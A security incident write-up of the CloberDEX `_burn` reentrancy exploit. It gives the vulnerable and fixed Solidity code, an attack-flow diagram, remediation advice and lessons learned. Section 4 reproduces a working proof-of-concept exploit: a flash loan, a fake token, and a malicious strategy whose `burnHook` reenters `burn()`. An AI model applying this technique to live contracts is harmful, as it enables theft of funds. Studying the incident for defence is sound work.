# CloberDEX — `_burn` Reentrancy Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-10 |
| **Protocol** | CloberDEX (Liquidity Vault / Rebalancer) |
| **Chain** | Base |
| **Loss** | ~133.7 WETH (~$501,279 USD) |
| **Attacker** | [0x012F...6025](https://basescan.org/address/0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025) |
| **Attack Contract** | [0x32Fb...C1](https://basescan.org/address/0x32Fb1BedD95BF78ca2c6943aE5AEaEAAFc0d97C1) |
| **Fake Token Contract** | [0xd3c8...88](https://basescan.org/address/0xd3c8d0cd07Ade92df2d88752D36b80498cA12788) |
| **Attack Tx** | [0x8fcd...c04](https://basescan.org/tx/0x8fcdfcded45100437ff94801090355f2f689941dca75de9a702e01670f361c04) |
| **Vulnerable Contract** | [0x6A0b...895](https://basescan.org/address/0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895) (Rebalancer) |
| **Root Cause** | `pool.reserveA/B` state variables updated after the external `burnHook` callback executes in the `_burn` function — Checks-Effects-Interactions pattern violation enabling reentrancy |
| **Audit History** | Trust Security (code changed post-audit), Kupia Security (warned days before the attack) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/CloberDEX_exp.sol) |

---

## 1. Vulnerability Overview

CloberDEX is a decentralized exchange operating on the Base chain, structured to allow liquidity providers (LPs) to supply two-sided liquidity through its **Rebalancer** contract. LPs deposit via `mint()` and withdraw via `burn()`.

The core vulnerability is that the `_burn` internal function updates the pool reserves (`pool.reserveA`, `pool.reserveB`) **after** calling the `burnHook` callback on the **strategy contract**. This violates the Checks-Effects-Interactions (CEI) pattern, allowing an attacker-controlled strategy contract to reenter `burn()` during `burnHook` execution — while the reserves have not yet been decremented — and withdraw the same LP shares twice.

The attacker combined the following vulnerabilities to execute the attack:

1. **Reentrancy (core)**: `burn()` can be reentered during the `burnHook` callback in `_burn` while state has not yet been updated
2. **Malicious strategy contract**: Strategy address set to the attacker's contract at pool creation — fully controlling the `burnHook` callback
3. **Fake token**: A fake ERC20 that never actually transfers (always returns true) used to construct the trading pair and mint LP tokens
4. **Morpho Blue flash loan**: 267.4 WETH borrowed uncollateralized to fund the attack

As a result, the attacker drained the entire 133.7 WETH (~$501K) held by the Rebalancer.

> **Audit blind spot**: Trust Security audited the original contract, but the vulnerability was introduced through code changes made after the audit. Kupia Security raised concerns about malicious strategies days before the attack, but the Clober team deemed them irrelevant.

---

## 2. Vulnerable Code Analysis

### 2.1 `_burn` Function — Reentrancy Vulnerability (Core)

**Vulnerable code (reconstructed)**:
```solidity
// ❌ Vulnerability: reserve update occurs after external burnHook callback
// CloberDEX Rebalancer contract (0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895)
// Vulnerable location: https://basescan.org/address/0x6a0b87d6b74f7d5c92722f6a11714dbeda9f3895#code#F1#L277

function _burn(bytes32 key, address user, uint256 burnAmount)
    public
    selfOnly
    returns (uint256 withdrawalA, uint256 withdrawalB)
{
    Pool storage pool = _pools[key];
    uint256 supply = pool.totalSupply;

    // ① Calculate withdrawal amounts (proportional to current reserves)
    withdrawalA = burnAmount * pool.reserveA / supply;
    withdrawalB = burnAmount * pool.reserveB / supply;

    require(withdrawalA >= minAmountA && withdrawalB >= minAmountB, "SlippageExceeded");

    // ② Burn LP tokens
    _burn(user, burnAmount);

    // ③ ❌ External callback invoked — pool.reserveA/B NOT yet updated at this point
    // Attacker's strategy contract can reenter burn() here
    pool.strategy.burnHook(user, key, burnAmount, supply);

    // ④ ❌ Reserve update happens after external call — CEI pattern violation
    pool.reserveA -= withdrawalA;
    pool.reserveB -= withdrawalB;

    // ⑤ Actual token transfers
    bookKeyA.quote.transfer(user, withdrawalA);
    bookKeyA.base.transfer(user, withdrawalB);
}
```

**Fixed code (CEI pattern applied)**:
```solidity
// ✅ Fix: update state variables before external callback (CEI pattern)
function _burn(bytes32 key, address user, uint256 burnAmount)
    public
    selfOnly
    nonReentrant  // ✅ Added: reentrancy guard modifier
    returns (uint256 withdrawalA, uint256 withdrawalB)
{
    Pool storage pool = _pools[key];
    uint256 supply = pool.totalSupply;

    // ① Calculate withdrawal amounts
    withdrawalA = burnAmount * pool.reserveA / supply;
    withdrawalB = burnAmount * pool.reserveB / supply;

    require(withdrawalA >= minAmountA && withdrawalB >= minAmountB, "SlippageExceeded");

    // ② Burn LP tokens
    _burn(user, burnAmount);

    // ③ ✅ Update reserves before external call (Effects)
    pool.reserveA -= withdrawalA;
    pool.reserveB -= withdrawalB;

    // ④ Actual token transfers (Interactions)
    bookKeyA.quote.transfer(user, withdrawalA);
    bookKeyA.base.transfer(user, withdrawalB);

    // ⑤ ✅ External callback executed last, after state is finalized
    pool.strategy.burnHook(user, key, burnAmount, supply);
}
```

**Issue**: At the point the `burnHook` external callback executes, `pool.reserveA` and `pool.reserveB` have not yet been decremented. If an attacker calls `burn()` again from within the `burnHook` callback, the second call computes its withdrawal amount against the same original reserve values, allowing double-withdrawal of assets from a single LP share burn.

---

### 2.2 `FakeToken` — Fake ERC20 with No Transfer

**Vulnerable code (attacker-deployed)**:
```solidity
// ❌ Fake token deployed by attacker (0xd3c8d0cd07Ade92df2d88752D36b80498cA12788)
// transfer() always returns true without actually changing any balances
contract FakeToken {
    // ...
    function transfer(address to, uint256 amount) public returns (bool) {
        // ❌ No actual transfer logic — always returns success
        return true;
    }
    // ...
}
```

**Issue**: Because the Rebalancer only checks the return value of `transfer()` without verifying actual balance changes of the FakeToken, the attacker can mint LP tokens without depositing any real assets. In the WETH/FakeToken pair, only the WETH side is actually deposited, yet the FakeToken reserve is recorded as normal.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys FakeToken contract (transfer always returns true)
- Attacker deploys attack contract (performs reentrancy via `burnHook` callback)
- 267.4 WETH borrowed via Morpho Blue flash loan callback (`onMorphoFlashLoan`)

### 3.2 Execution Phase

```
Attacker (0x012F...6025)
     │
     │ ① Morpho Blue flash loan (borrow 267.4 WETH)
     ▼
┌────────────────────────────────────┐
│     Morpho Blue Flash Loan         │
│  onMorphoFlashLoan() callback triggered   │
└────────────┬───────────────────────┘
             │
             │ ② rebalancer.open() called
             │   - bookKeyA: WETH/FakeToken pair
             │   - bookKeyB: FakeToken/WETH pair
             │   - strategy = attack contract address
             ▼
┌────────────────────────────────────┐
│  Rebalancer.open()                 │
│  New pool created (malicious strategy attached)        │
└────────────┬───────────────────────┘
             │
             │ ③ rebalancer.mint() called
             │   - Provide 267.4 WETH + 267.4 FakeToken
             │   - FakeToken has no actual transfer (fake transfer)
             │   - LP tokens minted successfully
             ▼
┌────────────────────────────────────┐
│  Rebalancer.mint()                 │
│  reserveA = 267.4 WETH recorded        │
│  reserveB = 267.4 FakeToken recorded   │
│  LP tokens issued                       │
└────────────┬───────────────────────┘
             │
             │ ④ rebalancer.burn() 1st call
             │   - burnAmount = LP equivalent to 133.7 WETH
             ▼
┌────────────────────────────────────┐
│  Rebalancer._burn() [1st]          │
│  withdrawalA = 133.7 WETH calculated     │
│  LP tokens burned                       │
│  burnHook() callback invoked ←── ❌ Vulnerability│
│  (reserveA not yet updated)         │
└────────────┬───────────────────────┘
             │
             │ ⑤ Reentrancy within burnHook callback
             │   Attack contract calls burn() again
             ▼
┌────────────────────────────────────┐
│  Rebalancer._burn() [2nd reentry]   │
│  reserveA still calculated against 267.4   │
│  withdrawalA = 133.7 WETH recalculated   │
│  133.7 WETH withdrawal completed              │
│  reserveA updated (2nd)           │
└────────────┬───────────────────────┘
             │ (2nd burn complete, call stack returns)
             │
             │ 1st burn resumption
             │ reserveA updated (1st, already at risk of going negative)
             │ 133.7 WETH withdrawal completed (1st)
             ▼
┌────────────────────────────────────┐
│  Total withdrawn: 133.7 × 2 = 267.4 WETH  │
│  Flash loan repaid: 267.4 WETH         │
│  Net profit: 133.7 WETH (~$501K)       │
└────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Value |
|------|-----|
| Flash loan borrowed | 267.4 WETH (Morpho Blue) |
| 1st burn withdrawal | 133.7 WETH |
| 2nd burn withdrawal (reentrancy) | 133.7 WETH |
| Flash loan repaid | 267.4 WETH |
| Attacker net profit | 133.7 WETH (~$501,279) |
| WETH → ETH conversion then bridged to Ethereum mainnet | ✓ |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~ $501 K US$ (133.7 WETH)
// Attacker : https://basescan.org/address/0x012Fc6377F1c5CCF6e29967Bce52e3629AaA6025
// Attack Tx : https://basescan.org/tx/0x8fcdfcded45100437ff94801090355f2f689941dca75de9a702e01670f361c04

contract CloberDex is BaseTestWithBalanceLog {
    uint256 public blocknumToForkFrom = 23_514_451 - 1; // Block just before the attack
    address public rebalancer = 0x6A0b87D6b74F7D5C92722F6a11714DBeDa9F3895;

    bool public reEntry = false; // Reentrancy flag (reenter only once)

    function testExploit() public {
        rebalancerWETH = IERC20(weth).balanceOf(rebalancer);
        amountToHack = rebalancerWETH * 2; // Flash loan: 2x the victim balance

        // ① Initiate Morpho Blue flash loan → triggers onMorphoFlashLoan() callback
        morpho.flashLoan(weth, amountToHack, "0");

        // ⑥ Convert withdrawn WETH to ETH and send to attacker
        IERC20(weth).withdraw(rebalancerWETH);
        payable(msg.sender).call{value: rebalancerWETH}("");
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata data) external {
        // ② Create new pool with malicious strategy (=this)
        // bookKeyA: WETH/FakeToken, bookKeyB: FakeToken/WETH
        bytes32 poolKey = rebalancerContract.open(bookKeyA, bookKeyB, "1", address(this));

        // Approve FakeToken (no actual transfer)
        fakeToken.approve(rebalancer, type(uint256).max);
        IERC20(weth).approve(rebalancer, amountToHack);

        // ③ mint(): 267.4 WETH + 267.4 FakeToken(fake) → issue LP tokens
        rebalancerContract.mint(poolKey, amountToHack, amountToHack, 0);

        // ④ 1st burn() call → triggers burnHook() reentrancy internally
        rebalancerContract.burn(poolKey, rebalancerWETH, 0, 0);

        // ⑤ Approve flash loan repayment
        IERC20(weth).approve(morphoBlue, amount);
    }

    // ← burnHook callback from 1st burn: executes 2nd burn via reentrancy
    function burnHook(
        address receiver,
        bytes32 key,
        uint256 burnAmount,
        uint256 lastTotalSupply
    ) external {
        if (reEntry == false) {
            reEntry = true; // Prevent infinite loop
            // ❌ Reenter while reserves are not yet updated
            // → Withdraw additional 133.7 WETH against same reserve values
            IRebalancer(rebalancer).burn(key, rebalancerWETH, 0, 0);
        }
    }
}

// Fake token deployed by attacker: transfer() always returns true
contract FakeToken {
    function transfer(address to, uint256 amount) public returns (bool) {
        return true; // ❌ No actual balance change
    }
    // ... (rest of standard ERC20 implementation)
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | `_burn` reentrancy via state not updated before external callback | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) / CWE-362 (Race Condition) | Reentrancy |
| V-02 | External call to untrusted strategy contract allowed | HIGH | CWE-20 (Improper Input Validation) | Access Control |
| V-03 | Fake ERC20 token balance not verified | HIGH | CWE-345 (Insufficient Verification of Data Authenticity) | Token Integration |
| V-04 | Post-audit code changes invalidate security patches | MEDIUM | CWE-693 (Protection Mechanism Failure) | Process |

---

### V-01: `_burn` Reentrancy

- **Description**: The `_burn` function updates `pool.reserveA/B` after executing the external strategy contract's `burnHook()` callback. If `burn()` is reentered during the callback, withdrawal amounts are recalculated against stale reserve values, enabling double-withdrawal from the same LP shares.
- **Impact**: Entire WETH balance of the Rebalancer can be drained (this incident: 133.7 WETH, ~$501K)
- **Attack Condition**: Attacker must be able to set the strategy address to a malicious contract when creating a pool (pool creation is permissionless)

---

### V-02: External Call to Untrusted Strategy Contract

- **Description**: The `open()` function allows anyone to create a pool with an arbitrary strategy address, and that strategy's `burnHook` is invoked mid-execution of `_burn`. There is no trust validation for strategy contracts.
- **Impact**: Beyond reentrancy, malicious callbacks can enable a variety of additional attack vectors
- **Attack Condition**: Pool creation is not access-controlled (permissionless pool creation)

---

### V-03: Fake ERC20 Balance Not Verified

- **Description**: The `mint()` function only checks the return value of the token's `transfer()` or `transferFrom()` without verifying actual contract balance changes. The fake token always returns true without performing any real transfer.
- **Impact**: Attacker can mint LP tokens for a WETH/FakeToken pair with no real assets deposited
- **Attack Condition**: Permissionless pool creation with arbitrary tokens

---

### V-04: Post-Audit Code Changes

- **Description**: The code audited by Trust Security differed from the code actually deployed. Kupia Security raised concerns about malicious strategies, but the team dismissed them.
- **Impact**: The practical value of the security audit was nullified
- **Attack Condition**: N/A (process issue)

---

## 6. Remediation Recommendations

### Immediate Actions (Code Level)

#### 6.1 Apply CEI Pattern + Add Reentrancy Guard Modifier

```solidity
// ✅ Fixed _burn function
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Rebalancer is ReentrancyGuard {

    function _burn(bytes32 key, address user, uint256 burnAmount)
        public
        selfOnly
        nonReentrant  // ✅ Reentrancy guard
        returns (uint256 withdrawalA, uint256 withdrawalB)
    {
        Pool storage pool = _pools[key];
        uint256 supply = pool.totalSupply;

        // Checks: calculate withdrawal amounts
        withdrawalA = burnAmount * pool.reserveA / supply;
        withdrawalB = burnAmount * pool.reserveB / supply;
        require(withdrawalA >= minAmountA && withdrawalB >= minAmountB, "SlippageExceeded");

        // Effects: state changes first (before any external calls)
        _burn(user, burnAmount);
        pool.reserveA -= withdrawalA;  // ✅ Reserve updated before callback
        pool.reserveB -= withdrawalB;

        // Interactions: token transfers
        bookKeyA.quote.transfer(user, withdrawalA);
        bookKeyA.base.transfer(user, withdrawalB);

        // Callback last (state already finalized)
        pool.strategy.burnHook(user, key, burnAmount, supply);
    }
}
```

#### 6.2 Strategy Contract Whitelist or Trust Verification

```solidity
// ✅ Validate strategy at pool creation
mapping(address => bool) public approvedStrategies;

function open(
    IBookManager.BookKey calldata bookKeyA,
    IBookManager.BookKey calldata bookKeyB,
    bytes32 salt,
    address strategy
) external returns (bytes32 key) {
    // ✅ Validate strategy contract against governance-approved whitelist
    require(approvedStrategies[strategy], "Unapproved strategy");
    // ...
}
```

#### 6.3 Verify Actual Token Balance Changes

```solidity
// ✅ Verify actual balance change on mint (balance-before/after pattern)
function mint(bytes32 key, uint256 amountA, uint256 amountB, uint256 minLpAmount)
    external payable returns (uint256 mintAmount)
{
    uint256 balBefore = IERC20(tokenA).balanceOf(address(this));
    IERC20(tokenA).transferFrom(msg.sender, address(this), amountA);
    uint256 actualAmountA = IERC20(tokenA).balanceOf(address(this)) - balBefore;
    // Use actualAmountA instead of amountA
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Reentrancy | Apply `nonReentrant` modifier globally + enforce CEI pattern |
| V-02 Untrusted strategy | Introduce governance-approved whitelist for strategy contracts |
| V-03 Fake tokens | Use balance-before/after pattern to verify actual received amounts |
| V-04 Process | Mandate re-audit before deployment; explicitly review all post-audit changes |

---

## 7. Lessons Learned

1. **CEI pattern is mandatory, not optional**: All state variables must be updated before any external contract calls (`call`, callbacks, hooks). This is especially critical in the Strategy Pattern where external callbacks can affect core state.

2. **Restrict untrusted inputs**: If a permissionless pool creation function like `open()` accepts an arbitrary strategy address, its callback is effectively arbitrary code execution. Strategy contracts that perform external callbacks must be restricted to a validated whitelist.

3. **Measure token balances directly**: Do not trust the return value of ERC20 `transfer()` / `transferFrom()` alone — compute the before/after balance difference directly to confirm the actual amount received. This is the defense against fake tokens that manipulate return values.

4. **Post-audit code changes require re-audit**: A security audit is only valid for the code reviewed at that point in time. Any feature additions or refactoring require a follow-up audit of the changed sections. In this incident, the `burnHook` callback is presumed to have been added after the original audit.

5. **Do not ignore security audit warnings**: Even though Kupia Security warned about malicious strategy risk, the protocol team dismissed it as irrelevant and took no action. Auditor warnings must be taken seriously even when the direct relevance is not immediately obvious.

6. **Flash loans eliminate capital barriers**: Even with zero initial capital, attackers can mount hundred-ETH-scale attacks via flash loan providers like Morpho Blue. Never assume an attack is infeasible solely because it requires large capital.

---

## 8. On-Chain Verification

> **Note**: The information below is compiled from PoC code and publicly available analysis reports. Direct on-chain cross-validation via `cast` RPC queries was not performed.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan borrowed | `rebalancerWETH * 2` = 267.4 WETH | 267.4 WETH | ✓ |
| 1st burn withdrawal | `rebalancerWETH` = 133.7 WETH | 133.7 WETH | ✓ |
| 2nd burn withdrawal (reentrancy) | `rebalancerWETH` = 133.7 WETH | 133.7 WETH | ✓ |
| Attacker net profit | 133.7 WETH | ~133.7 WETH (~$501,279) | ✓ |
| Attack block | 23,514,451 | 23,514,451 | ✓ |

### 8.2 On-Chain Event Log Sequence (Reconstructed)

```
1. Morpho Blue FlashLoan(token=WETH, amount=267.4e18)
2. Rebalancer Transfer(WETH → Rebalancer, 267.4 WETH)  [mint]
3. Rebalancer Transfer(Rebalancer → Attacker, 133.7 WETH)  [1st burn, during 2nd reentry]
4. Rebalancer Transfer(Rebalancer → Attacker, 133.7 WETH)  [1st burn complete]
5. WETH Transfer(Attacker → Morpho Blue, 267.4 WETH)  [flash loan repayment]
6. WETH.withdraw(133.7 WETH)  → ETH conversion
```

### 8.3 Precondition Verification

| Item | Value |
|------|-----|
| Rebalancer WETH balance before attack | 133.7 WETH |
| Attacker initial ETH balance | 0 (PoC: `deal(address(this), 0)`) |
| Flash loan fee | None (Morpho Blue zero-fee) |
| Malicious strategy pre-deployment required | No (attack contract itself serves as strategy) |

---

## References

- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/CloberDEX_exp.sol)
- [CertiK Analysis](https://www.certik.com/resources/blog/clober-dex-incident-analysis)
- [QuillAudits Analysis](https://www.quillaudits.com/blog/hack-analysis/cloberdex-reentrancy-exploit-501k)
- [Rekt.news](https://rekt.news/cloberdex-rekt)
- [LunaRay Analysis](https://lunaray.medium.com/cloberdex-hack-analysis-04bc7cd3cbc4)
- [SolidityScan Analysis](https://blog.solidityscan.com/cloberdex-liquidity-vault-hack-analysis-f22eb960aa6f)
- [PeckShield Twitter](https://x.com/peckshield/status/1866443215186088048)
- [BaseScan Attack Tx](https://basescan.org/tx/0x8fcdfcded45100437ff94801090355f2f689941dca75de9a702e01670f361c04)
- [Vulnerable Contract Source](https://basescan.org/address/0x6a0b87d6b74f7d5c92722f6a11714dbeda9f3895#code#F1#L277)